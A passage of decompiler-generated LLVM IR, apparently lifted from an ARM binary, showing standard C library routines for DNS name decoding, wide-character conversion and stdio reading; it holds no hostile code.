  uselistorder i32 %v0_108d4, { 0, 2, 1 }
  uselistorder i32 %v0_108bc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_108b4, { 1, 0 }
  uselistorder i32 %v2_108a0, { 1, 0 }
  uselistorder i32 %v1_10894, { 2, 0, 3, 1 }
  uselistorder i32 %v0_108a8, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_10878, { 1, 0 }
  uselistorder i32 %v0_10868, { 0, 2, 1, 3 }
  uselistorder i1 %v2_108bc20, { 1, 0 }
  uselistorder i32 %v9_10848, { 1, 0 }
  uselistorder i32 %v6_10848, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 7, 3, 8, 4, 6, 5, 1, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_v.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i32 16777216, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 34, 33, 36, 35, 37 }
  uselistorder i32 (i8*)* @strlen, { 4, 14, 1, 13, 15, 12, 11, 3, 2, 10, 9, 8, 6, 7, 5, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0, 6, 5, 4, 3 }
  uselistorder i32 46, { 0, 2, 3, 1 }
  uselistorder label %.loopexit, { 2, 0, 1 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_108d4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_108c8, { 1, 0 }
  uselistorder label %dec_label_pc_1087c, { 1, 0 }
}

define i32 @__decode_dotted() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_108f0 = load i32, i32* @r4, align 4
  %v6_108f0 = load i32, i32* @r5, align 4
  %v0_108f4 = load i32, i32* @r0, align 4
  store i32 %v0_108f4, i32* %sl.global-to-local, align 4
  %v2_108f4 = icmp eq i32 %v0_108f4, 0
  br i1 %v2_108f4, label %.thread16, label %dec_label_pc_10994.preheader

.thread16:                                        ; preds = %entry
  %v0_109001 = load i32, i32* @r2, align 4
  store i32 %v0_109001, i32* %sb.global-to-local, align 4
  %v0_109042 = load i32, i32* @r3, align 4
  store i32 %v0_109042, i32* %stack_var_-40, align 4
  br label %dec_label_pc_109b4

dec_label_pc_10994.preheader:                     ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_10900 = load i32, i32* @r2, align 4
  store i32 %v0_10900, i32* %sb.global-to-local, align 4
  %v0_10904 = load i32, i32* @r3, align 4
  store i32 %v0_10904, i32* %stack_var_-40, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  %v1_109943952 = load i32, i32* @r1, align 4
  %v2_109944053 = add i32 %v1_109943952, %v0_108f4
  %v3_109944154 = inttoptr i32 %v2_109944053 to i8*
  %v4_109944255 = load i8, i8* %v3_109944154, align 1
  %v6_109944356 = zext i8 %v4_109944255 to i32
  store i32 %v6_109944356, i32* @r4, align 4
  %v2_109984457 = icmp eq i8 %v4_109944255, 0
  br i1 %v2_109984457, label %bb35, label %dec_label_pc_10918.lr.ph

dec_label_pc_10918:                               ; preds = %dec_label_pc_10918.lr.ph, %bb30
  %v2_109a050 = phi i1 [ %v2_109a04663, %dec_label_pc_10918.lr.ph ], [ true, %bb30 ]
  %v6_1099448 = phi i32 [ %v6_109944361, %dec_label_pc_10918.lr.ph ], [ %v6_10994, %bb30 ]
  %v1_1099447 = phi i32 [ %v1_109943960, %dec_label_pc_10918.lr.ph ], [ %v5_10940, %bb30 ]
  %v1_1091c = and i32 %v6_1099448, 192
  br i1 %v2_109a050, label %bb28, label %bb

bb:                                               ; preds = %dec_label_pc_10918
  %v1_10920 = load i32, i32* %r8.global-to-local, align 4
  %v2_10920 = add i32 %v1_10920, 1
  store i32 %v2_10920, i32* %r8.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_10918, %bb
  %v2_10924 = icmp eq i32 %v1_1091c, 192
  %v1_10928 = add i32 %v1_1099447, 1
  store i32 %v1_10928, i32* @r5, align 4
  br i1 %v2_10924, label %dec_label_pc_10930, label %dec_label_pc_10950

dec_label_pc_10930:                               ; preds = %bb28
  %v2_10930 = add i32 %v1_10928, %v0_10930.ph59
  %v3_10930 = inttoptr i32 %v2_10930 to i8*
  %v4_10930 = load i8, i8* %v3_10930, align 1
  %v6_10930 = zext i8 %v4_10930 to i32
  %v1_10938 = urem i32 %v6_1099448, 64
  br i1 %v2_109a050, label %bb30, label %bb29

bb29:                                             ; preds = %dec_label_pc_10930
  %v1_1093c = load i32, i32* %r8.global-to-local, align 4
  %v2_1093c = add i32 %v1_1093c, 1
  store i32 %v2_1093c, i32* %r8.global-to-local, align 4
  br label %bb30

bb30:                                             ; preds = %dec_label_pc_10930, %bb29
  %v4_10940 = mul nuw nsw i32 %v1_10938, 256
  %v5_10940 = or i32 %v6_10930, %v4_10940
  store i32 %v5_10940, i32* %r1.global-to-local, align 4
  store i32 %storemerge17.ph58, i32* %r7.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v2_10994 = add i32 %v5_10940, %v0_10930.ph59
  %v3_10994 = inttoptr i32 %v2_10994 to i8*
  %v4_10994 = load i8, i8* %v3_10994, align 1
  %v6_10994 = zext i8 %v4_10994 to i32
  store i32 %v6_10994, i32* @r4, align 4
  %v2_10998 = icmp eq i8 %v4_10994, 0
  br i1 %v2_10998, label %dec_label_pc_109a0.bb36_crit_edge, label %dec_label_pc_10918

dec_label_pc_10950:                               ; preds = %bb28
  %v2_10950 = add i32 %v6_1099448, %storemerge17.ph58
  store i32 %v2_10950, i32* %r6.global-to-local, align 4
  %v2_10954 = load i32, i32* %stack_var_-40, align 4
  %v1_10958 = add i32 %v2_10950, 1
  store i32 %v1_10958, i32* %r7.global-to-local, align 4
  %v3_1095c = icmp ult i32 %v1_10958, %v2_10954
  br i1 %v3_1095c, label %dec_label_pc_10964, label %dec_label_pc_109b4

dec_label_pc_10964:                               ; preds = %dec_label_pc_10950
  %v2_10964 = add i32 %v1_10928, %v0_10930.ph59
  store i32 %v2_10964, i32* @r1, align 4
  %v0_10968 = load i32, i32* %sb.global-to-local, align 4
  %v2_10968 = add i32 %v0_10968, %storemerge17.ph58
  store i32 %v2_10968, i32* @r0, align 4
  store i32 %v6_1099448, i32* @r2, align 4
  %v0_10970 = call i32 @memcpy()
  %v0_10974 = load i32, i32* @r5, align 4
  %v1_10974 = load i32, i32* @r4, align 4
  %v2_10974 = add i32 %v1_10974, %v0_10974
  store i32 %v2_10974, i32* %r1.global-to-local, align 4
  %v0_10978 = load i32, i32* %sl.global-to-local, align 4
  %v2_10978 = add i32 %v0_10978, %v2_10974
  %v3_10978 = inttoptr i32 %v2_10978 to i8*
  %v4_10978 = load i8, i8* %v3_10978, align 1
  %v0_1097c = load i32, i32* %fp.global-to-local, align 4
  %v2_1097c = icmp eq i32 %v0_1097c, 0
  br i1 %v2_1097c, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_10964
  %v1_10980 = load i32, i32* %r8.global-to-local, align 4
  %v3_10980 = add i32 %v1_10980, %v1_10974
  store i32 %v3_10980, i32* %r8.global-to-local, align 4
  br label %bb32

bb32:                                             ; preds = %dec_label_pc_10964, %bb31
  %v2_10984 = icmp eq i8 %v4_10978, 0
  br i1 %v2_10984, label %bb34, label %bb33

bb33:                                             ; preds = %bb32
  br label %bb34

bb34:                                             ; preds = %bb32, %bb33
  %v0_1098c.off0 = phi i8 [ 0, %bb32 ], [ 46, %bb33 ]
  %v2_1098c = load i32, i32* %sb.global-to-local, align 4
  %v3_1098c = load i32, i32* %r6.global-to-local, align 4
  %v4_1098c = add i32 %v3_1098c, %v2_1098c
  %v5_1098c = inttoptr i32 %v4_1098c to i8*
  store i8 %v0_1098c.off0, i8* %v5_1098c, align 1
  %v0_10990.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_10994.pre.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_109a0.pre.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_1099439 = load i32, i32* %r1.global-to-local, align 4
  %v2_1099440 = add i32 %v1_1099439, %v0_10994.pre.pre
  %v3_1099441 = inttoptr i32 %v2_1099440 to i8*
  %v4_1099442 = load i8, i8* %v3_1099441, align 1
  %v6_1099443 = zext i8 %v4_1099442 to i32
  store i32 %v6_1099443, i32* @r4, align 4
  %v2_1099844 = icmp eq i8 %v4_1099442, 0
  %v2_109a046 = icmp eq i32 %v0_109a0.pre.pre, 0
  br i1 %v2_1099844, label %dec_label_pc_109a0, label %dec_label_pc_10918.lr.ph

dec_label_pc_10918.lr.ph:                         ; preds = %dec_label_pc_10994.preheader, %bb34
  %v2_109a04663 = phi i1 [ %v2_109a046, %bb34 ], [ false, %dec_label_pc_10994.preheader ]
  %v6_109944361 = phi i32 [ %v6_1099443, %bb34 ], [ %v6_109944356, %dec_label_pc_10994.preheader ]
  %v1_109943960 = phi i32 [ %v1_1099439, %bb34 ], [ %v1_109943952, %dec_label_pc_10994.preheader ]
  %v0_10930.ph59 = phi i32 [ %v0_10994.pre.pre, %bb34 ], [ %v0_108f4, %dec_label_pc_10994.preheader ]
  %storemerge17.ph58 = phi i32 [ %v0_10990.pre, %bb34 ], [ 0, %dec_label_pc_10994.preheader ]
  br label %dec_label_pc_10918

dec_label_pc_109a0:                               ; preds = %bb34
  br i1 %v2_109a046, label %dec_label_pc_109a0.bb36_crit_edge, label %bb35

dec_label_pc_109a0.bb36_crit_edge:                ; preds = %bb30, %dec_label_pc_109a0
  %v0_109a8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_109b4

bb35:                                             ; preds = %dec_label_pc_10994.preheader, %dec_label_pc_109a0
  %v1_109a4 = load i32, i32* %r8.global-to-local, align 4
  %v2_109a4 = add i32 %v1_109a4, 1
  store i32 %v2_109a4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_109b4

dec_label_pc_109b4:                               ; preds = %dec_label_pc_10950, %bb35, %dec_label_pc_109a0.bb36_crit_edge, %.thread16
  %storemerge = phi i32 [ -1, %.thread16 ], [ %v0_109a8.pre, %dec_label_pc_109a0.bb36_crit_edge ], [ %v2_109a4, %bb35 ], [ -1, %dec_label_pc_10950 ]
  store i32 %v3_108f0, i32* @r4, align 4
  store i32 %v6_108f0, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge17.ph58, { 2, 1, 0 }
  uselistorder i32 %v0_10930.ph59, { 2, 0, 1 }
  uselistorder i32 %v6_10994, { 1, 0 }
  uselistorder i32 %v5_10940, { 0, 2, 1 }
  uselistorder i32 %v6_1099448, { 2, 1, 0, 3 }
  uselistorder i1 %v2_109a050, { 1, 0 }
  uselistorder i32 %v0_108f4, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-40, { 1, 2, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 5, 4, 1, 6, 2, 7, 3, 8, 9 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 0, 3 }
  uselistorder i8 46, { 0, 2, 3, 4, 1, 5 }
  uselistorder label %dec_label_pc_109b4, { 1, 2, 0, 3 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %dec_label_pc_109a0.bb36_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10918.lr.ph, { 1, 0 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %bb32, { 1, 0 }
  uselistorder label %bb30, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @__length_dotted() local_unnamed_addr {
entry:
  %v0_109c0 = load i32, i32* @r0, align 4
  store i32 %v0_109c0, i32* @lr, align 4
  %v2_109c0 = icmp eq i32 %v0_109c0, 0
  br i1 %v2_109c0, label %bb, label %dec_label_pc_109d8

bb:                                               ; preds = %entry
  ret i32 -1

dec_label_pc_109d0:                               ; preds = %dec_label_pc_109e0
  %v1_109d0 = add i32 %v1_109e8, 2
  br label %dec_label_pc_10a00

dec_label_pc_109d8:                               ; preds = %entry
  %v0_109d8 = load i32, i32* @r1, align 4
  br label %dec_label_pc_109e8

dec_label_pc_109e0:                               ; preds = %dec_label_pc_109e8
  %v1_109f4 = and i32 %v6_109e8, 192
  %v2_109f8 = add i32 %v6_109e8, %v1_109ec
  %v2_109e0 = icmp eq i32 %v1_109f4, 192
  br i1 %v2_109e0, label %dec_label_pc_109d0, label %dec_label_pc_109e8

dec_label_pc_109e8:                               ; preds = %dec_label_pc_109e0, %dec_label_pc_109d8
  %v1_109e8 = phi i32 [ %v2_109f8, %dec_label_pc_109e0 ], [ %v0_109d8, %dec_label_pc_109d8 ]
  %v2_109e8 = add i32 %v1_109e8, %v0_109c0
  %v3_109e8 = inttoptr i32 %v2_109e8 to i8*
  %v4_109e8 = load i8, i8* %v3_109e8, align 1
  %v6_109e8 = zext i8 %v4_109e8 to i32
  %v1_109ec = add i32 %v1_109e8, 1
  %v2_109f0 = icmp eq i8 %v4_109e8, 0
  br i1 %v2_109f0, label %dec_label_pc_10a00, label %dec_label_pc_109e0

dec_label_pc_10a00:                               ; preds = %dec_label_pc_109e8, %dec_label_pc_109d0
  %v1_10a00 = phi i32 [ %v1_109d0, %dec_label_pc_109d0 ], [ %v1_109ec, %dec_label_pc_109e8 ]
  %v2_10a00 = sub i32 %v1_10a00, %v0_109d8
  ret i32 %v2_10a00

; uselistorder directives
  uselistorder i32 %v6_109e8, { 1, 0 }
  uselistorder i32 %v1_109e8, { 2, 1, 0 }
  uselistorder i32 %v0_109c0, { 0, 2, 1 }
  uselistorder i32 192, { 0, 4, 1, 5, 2, 3 }
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_10a0c = icmp eq i32 %arg1, 0
  br i1 %v2_10a0c, label %bb, label %.thread

.thread:                                          ; preds = %entry
  br label %bb11

bb:                                               ; preds = %entry
  %v3_10a14 = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_10a3c = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_10a30 = phi i32 [ %arg1, %.thread ], [ %v3_10a14, %bb ]
  store i32 %arg3, i32* @r4, align 4
  store i32 16, i32* @r3, align 4
  %v2_10a28 = ptrtoint i32* %stack_var_-16 to i32
  %v2_10a34 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_10a34, i32* %stack_var_-16, align 4
  store i32 %v0_10a3c, i32* %stack_var_-12, align 4
  %v5_10a44 = inttoptr i32 %v0_10a30 to i8*
  %v6_10a44 = call i32 @__GI_wcsnrtombs(i8* %v5_10a44, i32 %v2_10a28, i32 1, i32 16, i32 %arg3)
  %v2_10a48 = icmp eq i32 %v6_10a44, 0
  br i1 %v2_10a48, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v8_10a54 = phi i32 [ %v6_10a44, %bb11 ], [ 1, %bb12 ]
  ret i32 %v8_10a54

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %v0_10a64 = load i32, i32* @r2, align 4
  store i32 %v0_10a64, i32* @r3, align 4
  %v0_10a6c = load i32, i32* @r0, align 4
  %v1_10a6c = load i32, i32* @r1, align 4
  %v5_10a6c = inttoptr i32 %v0_10a6c to i8*
  %v6_10a6c = call i32 @__GI_wcsnrtombs(i8* %v5_10a6c, i32 %v1_10a6c, i32 -1, i32 %v0_10a64, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_10a6c
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10a78 = load i32, i32* @r4, align 4
  store i32 %v3_10a78, i32* %stack_var_-8, align 4
  %v10_10a7c = icmp eq i32 %tmp, %arg2
  br i1 %v10_10a7c, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v0_10a841 = load i32, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10a98

bb:                                               ; preds = %entry
  %v4_10a80 = icmp eq i8* %arg1, null
  %v0_10a84 = load i32, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br i1 %v4_10a80, label %dec_label_pc_10a98, label %bb27

bb27:                                             ; preds = %bb
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10ad4

dec_label_pc_10a98:                               ; preds = %.thread, %bb
  %v1_10ad8.ph = phi i32 [ %v0_10a84, %bb ], [ %v0_10a841, %.thread ]
  %v2_10a883.ph = ptrtoint i32* %stack_var_-24 to i32
  %v3_10a98 = icmp eq i8* %arg1, null
  store i32 %v2_10a883.ph, i32* %ip.global-to-local, align 4
  br i1 %v3_10a98, label %.thread4, label %dec_label_pc_10acc

.thread4:                                         ; preds = %dec_label_pc_10a98
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %dec_label_pc_10ad4

dec_label_pc_10ab0:                               ; preds = %dec_label_pc_10aec
  %v0_10ab0 = call i32 @__errno_location()
  store i32 %v0_10ab0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_10abc = inttoptr i32 %v0_10ab0 to i32*
  store i32 84, i32* %v2_10abc, align 4
  %v0_10b28.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10b28

dec_label_pc_10ac4:                               ; preds = %dec_label_pc_10afc
  %v3_10b00 = zext i8 %v2_10b00 to i32
  store i32 %v3_10b00, i32* @lr, align 4
  br label %dec_label_pc_10b1c

dec_label_pc_10acc:                               ; preds = %dec_label_pc_10a98
  store i32 %v2_10a883.ph, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10ad4

dec_label_pc_10ad4:                               ; preds = %bb27, %.thread4, %dec_label_pc_10acc
  %v1_10ad820 = phi i32 [ %v0_10a84, %bb27 ], [ %v1_10ad8.ph, %.thread4 ], [ %v1_10ad8.ph, %dec_label_pc_10acc ]
  %v2_10afc14 = phi i32 [ %tmp, %bb27 ], [ %v2_10a883.ph, %.thread4 ], [ %v2_10a883.ph, %dec_label_pc_10acc ]
  %v1_10ad4 = load i32, i32* @r3, align 4
  %v3_10ad4 = icmp uge i32 %v1_10ad820, %v1_10ad4
  %v1_10ad4.v1_10ad820 = select i1 %v3_10ad4, i32 %v1_10ad4, i32 %v1_10ad820
  store i32 %v1_10ad4.v1_10ad820, i32* %r4.global-to-local, align 4
  %v1_10ae0 = inttoptr i32 %arg2 to i32*
  %v2_10ae0 = load i32, i32* %v1_10ae0, align 4
  store i32 %v2_10ae0, i32* @lr, align 4
  store i32 %v1_10ad4.v1_10ad820, i32* %r0.global-to-local, align 4
  %v2_10b148 = icmp eq i32 %v1_10ad4.v1_10ad820, 0
  br i1 %v2_10b148, label %dec_label_pc_10b1c, label %dec_label_pc_10aec

dec_label_pc_10aec:                               ; preds = %dec_label_pc_10ad4, %dec_label_pc_10b0c.dec_label_pc_10aec_crit_edge
  %v2_10afc = phi i32 [ %v2_10b0c, %dec_label_pc_10b0c.dec_label_pc_10aec_crit_edge ], [ %v2_10afc14, %dec_label_pc_10ad4 ]
  %v0_10af4 = phi i32 [ %v0_10aec.pre, %dec_label_pc_10b0c.dec_label_pc_10aec_crit_edge ], [ %v2_10ae0, %dec_label_pc_10ad4 ]
  %v1_10aec = inttoptr i32 %v0_10af4 to i32*
  %v2_10aec = load i32, i32* %v1_10aec, align 4
  %v1_10af4 = add i32 %v0_10af4, 4
  store i32 %v1_10af4, i32* @lr, align 4
  %tmp36 = icmp ugt i32 %v2_10aec, 127
  br i1 %tmp36, label %dec_label_pc_10ab0, label %dec_label_pc_10afc

dec_label_pc_10afc:                               ; preds = %dec_label_pc_10aec
  %v1_10afc = trunc i32 %v2_10aec to i8
  %v3_10afc = inttoptr i32 %v2_10afc to i8*
  store i8 %v1_10afc, i8* %v3_10afc, align 1
  %v0_10b00 = load i32, i32* %ip.global-to-local, align 4
  %v1_10b00 = inttoptr i32 %v0_10b00 to i8*
  %v2_10b00 = load i8, i8* %v1_10b00, align 1
  %v2_10b04 = icmp eq i8 %v2_10b00, 0
  br i1 %v2_10b04, label %dec_label_pc_10ac4, label %dec_label_pc_10b0c

dec_label_pc_10b0c:                               ; preds = %dec_label_pc_10afc
  %v1_10b0c = load i32, i32* %r2.global-to-local, align 4
  %v2_10b0c = add i32 %v1_10b0c, %v0_10b00
  store i32 %v2_10b0c, i32* %ip.global-to-local, align 4
  %v0_10b10 = load i32, i32* %r0.global-to-local, align 4
  %v1_10b10 = add i32 %v0_10b10, -1
  store i32 %v1_10b10, i32* %r0.global-to-local, align 4
  %v2_10b14 = icmp eq i32 %v1_10b10, 0
  br i1 %v2_10b14, label %dec_label_pc_10b1c, label %dec_label_pc_10b0c.dec_label_pc_10aec_crit_edge

dec_label_pc_10b0c.dec_label_pc_10aec_crit_edge:  ; preds = %dec_label_pc_10b0c
  %v0_10aec.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_10aec

dec_label_pc_10b1c:                               ; preds = %dec_label_pc_10b0c, %dec_label_pc_10ad4, %dec_label_pc_10ac4
  %v0_10b1c = phi i32 [ %v0_10b00, %dec_label_pc_10ac4 ], [ %v2_10afc14, %dec_label_pc_10ad4 ], [ %v2_10b0c, %dec_label_pc_10b0c ]
  %v1_10b1c = load i32, i32* @sp, align 4
  %v9_10b1c = icmp eq i32 %v0_10b1c, %v1_10b1c
  br i1 %v9_10b1c, label %bb31, label %bb30

bb30:                                             ; preds = %dec_label_pc_10b1c
  %v1_10b20 = load i32, i32* @lr, align 4
  store i32 %v1_10b20, i32* %v1_10ae0, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_10b1c, %bb30
  %v0_10b24 = load i32, i32* %r0.global-to-local, align 4
  %v1_10b24 = load i32, i32* %r4.global-to-local, align 4
  %v2_10b24 = sub i32 %v1_10b24, %v0_10b24
  store i32 %v2_10b24, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10b28

dec_label_pc_10b28:                               ; preds = %dec_label_pc_10ab0, %bb31
  %v0_10b28 = phi i32 [ %v0_10b28.pre, %dec_label_pc_10ab0 ], [ %v2_10b24, %bb31 ]
  store i32 %v0_10b28, i32* %r0.global-to-local, align 4
  %v2_10b30 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10b30, i32* %r4.global-to-local, align 4
  ret i32 %v0_10b28

; uselistorder directives
  uselistorder i32 %v0_10b28, { 1, 0 }
  uselistorder i32 %v1_10b10, { 1, 0 }
  uselistorder i32 %v2_10b0c, { 0, 2, 1 }
  uselistorder i32 %v2_10aec, { 1, 0 }
  uselistorder i32 %v2_10afc14, { 1, 0 }
  uselistorder i32 %v1_10ad8.ph, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 3, 8, 6, 4, 5, 7, 9, 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 6, 3, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32* @sp, { 1, 0 }
  uselistorder i8* null, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10b28, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_10aec, { 1, 0 }
  uselistorder label %dec_label_pc_10ad4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10a98, { 1, 0 }
}

define i32 @__stdio_READ(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_10b34 = load i32, i32* @r4, align 4
  store i32 %v3_10b34, i32* %stack_var_-12, align 4
  %v3_10b38 = load i8, i8* %arg1, align 1
  %v4_10b38 = zext i8 %v3_10b38 to i32
  store i32 %v4_10b38, i32* %r3.global-to-local, align 4
  %v1_10b3c = and i32 %v4_10b38, 4
  store i32 %v1_10b3c, i32* %r5.global-to-local, align 4
  %v2_10b3c = icmp eq i32 %v1_10b3c, 0
  store i1 %v2_10b3c, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v2_10b3c, label %bb8, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_10b34, i32* @r4, align 4
  ret i32 0

bb8:                                              ; preds = %entry
  %v1_10b4c = icmp slt i32 %arg2, 0
  %v2_10b4c = icmp eq i32 %arg2, 0
  store i1 %v2_10b4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_10b4c, label %bb9, label %bb10

bb9:                                              ; preds = %bb8
  store i32 2147483647, i32* @r2, align 4
  br label %bb10

bb10:                                             ; preds = %bb8, %bb9
  %v1_10b54 = add i32 %tmp, 4
  %v2_10b54 = inttoptr i32 %v1_10b54 to i32*
  %v3_10b54 = load i32, i32* %v2_10b54, align 4
  store i32 %v3_10b54, i32* %r0.global-to-local, align 4
  %v1_10b58 = call i32 @__libc_read(i32 %v3_10b54)
  store i32 %v1_10b58, i32* %r0.global-to-local, align 4
  %v2_10b5c = icmp eq i32 %v1_10b58, 0
  store i1 %v2_10b5c, i1* %cpsr_z.global-to-local, align 1
  %tmp11 = icmp slt i32 %v1_10b58, 1
  br i1 %tmp11, label %bb13, label %bb12

bb12:                                             ; preds = %bb10
  %v7_10b60 = load i32, i32* %stack_var_-12, align 4
  store i32 %v7_10b60, i32* @r4, align 4
  ret i32 %v1_10b58

bb13:                                             ; preds = %bb10
  %v0_10b64 = load i32, i32* @r4, align 4
  %v1_10b64 = inttoptr i32 %v0_10b64 to i32*
  %v2_10b64 = load i32, i32* %v1_10b64, align 4
  %v1_10b68 = or i32 %v2_10b64, 8
  store i32 %v1_10b68, i32* %r1.global-to-local, align 4
  %v1_10b6c = or i32 %v2_10b64, 4
  store i32 %v1_10b6c, i32* %r3.global-to-local, align 4
  %v3_10b70 = sdiv i32 %v2_10b64, 256
  store i32 %v3_10b70, i32* %ip.global-to-local, align 4
  br i1 %v2_10b5c, label %.thread, label %bb14

bb14:                                             ; preds = %bb13
  %v1_10b78 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_10b78, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread:                                          ; preds = %bb13
  %v2_10b7c = trunc i32 %v3_10b70 to i8
  %v4_10b7c = add i32 %v0_10b64, 1
  %v5_10b7c = inttoptr i32 %v4_10b7c to i8*
  store i8 %v2_10b7c, i8* %v5_10b7c, align 1
  %v0_10b80.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10b80.pr, label %.thread1, label %.thread2

.thread1:                                         ; preds = %.thread
  %v1_10b80 = load i32, i32* %r3.global-to-local, align 4
  %v2_10b80 = trunc i32 %v1_10b80 to i8
  %v3_10b80 = load i32, i32* @r4, align 4
  %v4_10b80 = inttoptr i32 %v3_10b80 to i8*
  store i8 %v2_10b80, i8* %v4_10b80, align 1
  %v0_10b84.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10b84.pr.pr, label %.thread3, label %.thread2

.thread2:                                         ; preds = %bb14, %.thread, %.thread1
  %v1_10b84 = load i32, i32* %ip.global-to-local, align 4
  %v2_10b84 = trunc i32 %v1_10b84 to i8
  %v3_10b84 = load i32, i32* @r4, align 4
  %v4_10b84 = add i32 %v3_10b84, 1
  %v5_10b84 = inttoptr i32 %v4_10b84 to i8*
  store i8 %v2_10b84, i8* %v5_10b84, align 1
  %v0_10b88.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10b88.pr, label %.thread3, label %bb15

bb15:                                             ; preds = %.thread2
